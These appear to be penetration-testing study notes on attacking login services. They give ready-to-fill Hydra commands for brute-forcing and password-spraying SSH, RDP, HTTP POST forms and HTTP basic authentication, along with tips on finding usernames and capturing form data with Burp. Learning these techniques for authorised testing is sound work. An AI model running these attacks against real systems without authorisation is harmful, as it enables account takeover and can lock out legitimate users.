# Attacking Network Services Logins

## SSH and RDP
Hydra
```bash
hydra -l <USERNAME> -P <PASSWORDLIST_PATH> -s <PORT> ssh://<TARGETIP>
```
We can find usernames by enumeration/information gathering techniques and by using built-in accounts such as root or Administrator

Password spraying: single password, many usernames

Once you have a password, TRY USING IT EVERYWHERE!!!

Hydra can help with this:
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "<PASSWORD>" rdp://<TARGET_IP>
```

This can lead to accounts being locked out so do not blindly launch these tools.

## HTTP POST Login Form
Check the documentation of a web application to find default users. Then perform bruteforce on those users.

We need 2 pieces of info:
1. POST data itself
2. Failed login attempt (to differentiate between failure and success) -- condition string

Burp!

Now, we can use Hydra:
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "<LOGINFORM_LOCATION>:<LOGIN_POST_DATA>:<CONDITION_STRING>"
```
Within the <LOGIN_POST_DATA> you need to specify the string to replace as `^PASS^`

For HTTP basic authentication (even if it is encoded in Burp), you can brute force using a user/password list
```bash
hydra -l admin -P rockyou.txt 192.168.191.201 http-get /
```
